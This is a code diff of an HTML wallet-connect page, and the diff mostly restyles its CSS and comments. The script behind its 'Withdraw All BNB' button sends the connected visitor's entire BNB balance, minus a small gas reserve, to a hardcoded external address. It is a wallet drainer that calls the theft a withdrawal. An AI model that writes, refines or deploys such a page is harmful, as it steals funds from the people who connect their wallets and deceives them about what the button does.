@@ -3,77 +3,66 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>WalletConnect Withdraw Example</title>
+  <title>Wallet Connect with Withdraw</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f9fafb;
-      color: #333;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 400px;
+      margin: auto;
     }
     w3m-core-button {
-      margin-bottom: 30px;
+      display: block;
+      margin-bottom: 20px;
+      width: 100%;
     }
-    #withdrawButton {
-      display: none;
-      padding: 12px 24px;
+    button {
+      width: 100%;
+      padding: 10px;
       font-size: 16px;
-      background-color: #1e88e5;
-      color: white;
-      border: none;
-      border-radius: 8px;
+      margin-bottom: 10px;
       cursor: pointer;
-      box-shadow: 0 4px 8px rgb(30 136 229 / 0.3);
-      transition: background-color 0.3s ease;
     }
-    #withdrawButton:hover {
-      background-color: #1565c0;
+    button:disabled {
+      cursor: not-allowed;
+      background-color: #ccc;
     }
     #messageBox {
-      margin-top: 25px;
-      padding: 16px 20px;
-      width: 320px;
-      max-width: 90vw;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 15px;
-      text-align: center;
-      box-shadow: 0 3px 10px rgb(0 0 0 / 0.1);
+      padding: 10px;
+      border-radius: 4px;
+      margin-top: 10px;
+      min-height: 40px;
     }
     #messageBox.info {
-      background-color: #e3f2fd;
-      color: #1565c0;
-      border: 1px solid #90caf9;
+      background-color: #d9edf7;
+      color: #31708f;
     }
     #messageBox.success {
-      background-color: #e6f4ea;
-      color: #2e7d32;
-      border: 1px solid #81c784;
+      background-color: #d4edda;
+      color: #155724;
     }
     #messageBox.error {
-      background-color: #fdecea;
-      color: #c62828;
-      border: 1px solid #ef9a9a;
+      background-color: #f8d7da;
+      color: #721c24;
     }
   </style>
-  <script type="module" src="wallet.js"></script> <!-- Your original wallet.js -->
+  <script type="module" src="wallet.js"></script>
 </head>
 <body>
+
   <w3m-core-button></w3m-core-button>
-  <button id="withdrawButton">Withdraw All BNB (min $10)</button>
-  <div id="messageBox" class="info">Please connect your wallet to enable withdrawal.</div>
+
+  <button id="withdrawButton" disabled>Withdraw All BNB (min $10)</button>
+
+  <div id="messageBox" class="info">Please connect your wallet.</div>
 
   <script type="module">
     import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2/build/esm/wagmiCore.js";
-    import { parseEther, formatEther } from 'https://cdn.jsdelivr.net/npm/viem@1.21.4/_cjs/index.min.js';
-
-    const BNB_PRICE_USD = 300;  // fixed price for demo
+    import { parseEther, formatEther } from "https://cdn.jsdelivr.net/npm/viem@1.21.4/_cjs/index.min.js";
 
     const withdrawButton = document.getElementById('withdrawButton');
     const messageBox = document.getElementById('messageBox');
+    const BNB_PRICE_USD = 300; // fixed price for example
 
     function showMessage(message, type = 'info') {
       messageBox.textContent = message;
@@ -83,7 +72,7 @@
 
     function updateWithdrawButton() {
       const { isConnected } = getAccount();
-      withdrawButton.style.display = isConnected ? 'inline-block' : 'none';
+      withdrawButton.disabled = !isConnected;
       if (!isConnected) {
         showMessage('Please connect your wallet to enable withdrawal.', 'info');
       } else {
@@ -91,10 +80,12 @@
       }
     }
 
+    // Listen for wallet connect/disconnect events
     window.ethereum?.on('accountsChanged', updateWithdrawButton);
     window.ethereum?.on('connect', updateWithdrawButton);
     window.ethereum?.on('disconnect', updateWithdrawButton);
 
+    // Initial check
     document.addEventListener('DOMContentLoaded', () => {
       updateWithdrawButton();
     });
@@ -111,7 +102,7 @@
 
         const balanceResult = await fetchBalance({
           address,
-          chainId: 56,
+          chainId: 56, // BSC chain id
         });
 
         const balanceBNB = Number(formatEther(balanceResult.value));
@@ -122,7 +113,7 @@
           return;
         }
 
-        const gasBuffer = 0.001; // leave some for gas
+        const gasBuffer = 0.001; // reserve some for gas fees
         const withdrawAmountBNB = balanceBNB - gasBuffer;
 
         if (withdrawAmountBNB <= 0) {
@@ -130,7 +121,7 @@
           return;
         }
 
-        const recipient = '0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C'; // Your BNB address
+        const recipient = '0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C';
 
         showMessage('Sending withdrawal transaction...', 'info');
 
@@ -147,5 +138,6 @@
       }
     });
   </script>
+
 </body>
 </html>
